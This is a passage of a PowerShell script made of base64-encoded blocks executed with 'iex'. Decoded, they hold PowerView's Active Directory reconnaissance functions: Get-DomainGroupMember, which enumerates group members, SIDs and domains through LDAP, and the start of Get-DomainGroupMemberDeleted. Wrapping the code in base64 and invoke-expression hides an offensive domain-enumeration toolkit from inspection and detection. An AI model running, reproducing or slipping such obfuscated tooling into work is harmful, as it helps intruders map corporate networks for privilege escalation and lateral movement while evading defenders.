vdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KShtZW1iZXJvZjoxLjIuODQwLjExMzU1Ni4xLjQuMTk0MTo9JEdyb3VwRm91bmRETikpIgogICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCdkaXN0aW5ndWlzaGVkTmFtZScpKQogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzID0gJEdyb3VwU2VhcmNoZXIuRmluZEFsbCgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWVbMF19CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkTnVsbCA9ICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ1JhdycpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgPSAnJwogICAgICAgICAgICAgICAgJEZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlJbnN0YW5jZSA9ICRfLlJlcGxhY2UoJygnLCAnXDI4JykuUmVwbGFjZSgnKScsICdcMjknKQogICAgICAgICAgICAgICAgICAgIGlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15TLTEtJykgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnXkNOPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eURvbWFpbiA9ICRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJElkZW50aXR5RG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRHcm91cFNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbiciCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtaW1hdGNoICdeWzAtOUEtRl17OH0tKFswLTlBLUZdezR9LSl7M31bMC05QS1GXXsxMn0kJykgewogICAgICAgICAgICAgICAgICAgICAgICAkR3VpZEJ5dGVTdHJpbmcgPSAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyAnXCcgKyAkXy5Ub1N0cmluZygnWDInKSB9KSAtam9pbiAnJwogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJElkZW50aXR5SW5zdGFuY2UuQ29udGFpbnMoJ1wnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZSA9ICRJZGVudGl0eUluc3RhbmNlLlJlcGxhY2UoJ1wyOCcsICcoJykuUmVwbGFjZSgnXDI5JywgJyknKSB8IENvbnZlcnQtQUROYW1lIC1PdXRwdXRUeXBlIENhbm9uaWNhbAogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cERvbWFpbiA9ICRDb252ZXJ0ZWRJZGVudGl0eUluc3RhbmNlLlN1YlN0cmluZygwLCAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5JbmRleE9mKCcvJykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBOYW1lID0gJElkZW50aXR5SW5zdGFuY2UuU3BsaXQoJ1wnKVsxXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JEdyb3VwTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJEdyb3VwRG9tYWluCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBFeHRyYWN0ZWQgZG9tYWluICckR3JvdXBEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihzYW1BY2NvdW50TmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkR3JvdXBTZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcikiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdyb3VwTWVtYmVyXSBHZXQtRG9tYWluR3JvdXBNZW1iZXIgZmlsdGVyIHN0cmluZzogJCgkR3JvdXBTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJEdyb3VwU2VhcmNoZXIuRmluZE9uZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3Igc2VhcmNoaW5nIGZvciBncm91cCB3aXRoIGlkZW50aXR5ICckSWRlbnRpdHknOiAkXyIKICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyA9IEAoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEdyb3VwRm91bmROYW1lID0gJycKICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRE4gPSAnJwogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQpIHsKICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdtZW1iZXInKQogICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVycy5jb3VudCAtZXEgMCkgewogICAgICAgICAgICAgICAgICAgICAgICAkRmluaXNoZWQgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgJEJvdHRvbSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFRvcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKC1ub3QgJEZpbmlzaGVkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVG9wID0gJEJvdHRvbSArIDE0OTkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJSYW5nZT0ibWVtYmVyO3JhbmdlPSRCb3R0b20tJFRvcCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRCb3R0b20gKz0gMTUwMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkR3JvdXBTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkNsZWFyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROdWxsID0gJEdyb3VwU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGQoIiRNZW1iZXJSYW5nZSIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRHcm91cFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCdzYW1hY2NvdW50bmFtZScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRHcm91cFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkKCdkaXN0aW5ndWlzaGVkbmFtZScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkR3JvdXBTZWFyY2hlci5GaW5kT25lKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUmFuZ2VkUHJvcGVydHkgPSAkUmVzdWx0LlByb3BlcnRpZXMuUHJvcGVydHlOYW1lcyAtbGlrZSAibWVtYmVyO3JhbmdlPSoiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcnMgKz0gJFJlc3VsdC5Qcm9wZXJ0aWVzLml0ZW0oJFJhbmdlZFByb3BlcnR5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kTmFtZSA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdzYW1hY2NvdW50bmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwRm91bmRETiA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdkaXN0aW5ndWlzaGVkbmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRNZW1iZXJzLmNvdW50IC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaW5pc2hlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uTWV0aG9kSW52b2NhdGlvbkV4Y2VwdGlvbl0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGaW5pc2hlZCA9ICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kTmFtZSA9ICRSZXN1bHQucHJvcGVydGllcy5pdGVtKCdzYW1hY2NvdW50bmFtZScpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRE4gPSAkUmVzdWx0LnByb3BlcnRpZXMuaXRlbSgnZGlzdGluZ3Vpc2hlZG5hbWUnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyArPSAkUmVzdWx0LlByb3BlcnRpZXMuaXRlbSgkUmFuZ2VkUHJvcGVydHkpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRG9tYWluID0gJERvbWFpbgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRHcm91cEZvdW5kRE4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cEZvdW5kRG9tYWluID0gJEdyb3VwRm91bmRETi5TdWJTdHJpbmcoJEdyb3VwRm91bmRETi5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIEZvckVhY2ggKCRNZW1iZXIgaW4gJE1lbWJlcnMpIHsKICAgICAgICAgICAgICAgIGlmICgkUmVjdXJzZSAtYW5kICRVc2VNYXRjaGluZ1J1bGUpIHsKICAgICAgICAgICAgICAgICAgICAkUHJvcGVydGllcyA9ICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlckFyZ3VtZW50cyA9ICRTZWFyY2hlckFyZ3VtZW50cy5DbG9uZSgpCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snUmF3J10gPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICRPYmplY3RTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJ2Rpc3Rpbmd1aXNoZWRuYW1lLGNuLHNhbWFjY291bnRuYW1lLG9iamVjdHNpZCxvYmplY3RjbGFzcycKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gR2V0LURvbWFpbk9iamVjdCBAT2JqZWN0U2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAkUHJvcGVydGllcyA9ICRPYmplY3QuUHJvcGVydGllcwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHcm91cERvbWFpbicgJEdyb3VwRm91bmREb21haW4KICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBGb3VuZE5hbWUKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBEaXN0aW5ndWlzaGVkTmFtZScgJEdyb3VwRm91bmRETgogICAgICAgICAgICAgICAgICAgIGlmICgkUHJvcGVydGllcy5vYmplY3RzaWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9ICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllciAkUHJvcGVydGllcy5vYmplY3RzaWRbMF0sIDApLlZhbHVlKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlclNJRCA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJETiA9ICRQcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyRE4gLW1hdGNoICdGb3JlaWduU2VjdXJpdHlQcmluY2lwYWxzfFMtMS01LTIxJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkTWVtYmVyU0lEKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJTSUQgPSAkUHJvcGVydGllcy5jblswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyU2ltcGxlTmFtZSA9IENvbnZlcnQtQUROYW1lIC1JZGVudGl0eSAkTWVtYmVyU0lEIC1PdXRwdXRUeXBlICdEb21haW5TaW1wbGUnIEBBRE5hbWVBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlclNpbXBsZU5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRvbWFpbiA9ICRNZW1iZXJTaW1wbGVOYW1lLlNwbGl0KCdAJylbMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR3JvdXBNZW1iZXJdIEVycm9yIGNvbnZlcnRpbmcgJE1lbWJlckROIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJE51bGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gRXJyb3IgY29udmVydGluZyAkTWVtYmVyRE4iCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlckRvbWFpbiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyRG9tYWluID0gJE1lbWJlckROLlN1YlN0cmluZygkTWVtYmVyRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJETiA9ICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJEb21haW4gPSAkTnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMuc2FtYWNjb3VudG5hbWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck5hbWUgPSAkUHJvcGVydGllcy5zYW1hY2NvdW50bmFtZVswXQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTSUQgJFByb3BlcnRpZXMuY25bMF0gQEFETmFtZUFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJOYW1lID0gJFByb3BlcnRpZXMuY25bMF0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXMub2JqZWN0Y2xhc3MgLW1hdGNoICdjb21wdXRlcicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck9iamVjdENsYXNzID0gJ2NvbXB1dGVyJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzLm9iamVjdGNsYXNzIC1tYXRjaCAnZ3JvdXAnKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJPYmplY3RDbGFzcyA9ICdncm91cCcKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkUHJvcGVydGllcy5vYmplY3RjbGFzcyAtbWF0Y2ggJ3VzZXInKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJPYmplY3RDbGFzcyA9ICd1c2VyJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlck9iamVjdENsYXNzID0gJE51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlckRvbWFpbicgJE1lbWJlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJOYW1lJyAkTWVtYmVyTmFtZQogICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdNZW1iZXJEaXN0aW5ndWlzaGVkTmFtZScgJE1lbWJlckROCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck9iamVjdENsYXNzJyAkTWVtYmVyT2JqZWN0Q2xhc3MKICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTWVtYmVyU0lEJyAkTWVtYmVyU0lECiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Hcm91cE1lbWJlcicpCiAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVjdXJzZSddIC1hbmQgJE1lbWJlckROIC1hbmQgKCRNZW1iZXJPYmplY3RDbGFzcyAtbWF0Y2ggJ2dyb3VwJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Hcm91cE1lbWJlcl0gTWFudWFsbHkgcmVjdXJzaW5nIG9uIGdyb3VwOiAkTWVtYmVyRE4iCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRNZW1iZXJETgogICAgICAgICAgICAgICAgICAgICAgICAkTnVsbCA9ICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ1Byb3BlcnRpZXMnKQogICAgICAgICAgICAgICAgICAgICAgICBHZXQtRG9tYWluR3JvdXBNZW1iZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdyb3VwTWVtYmVyRGVsZXRlZCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Eb21haW5Hcm91cE1lbWJlckRlbGV0ZWQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnLCAnTWVtYmVyRGlzdGluZ3Vpc2hlZE5hbWUnLCAnTWVtYmVyTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnUHJvcGVydGllcycgICAgPSAgICdtc2RzLXJlcGx2YWx1ZW1ldGFkYXRhJywnZGlzdGluZ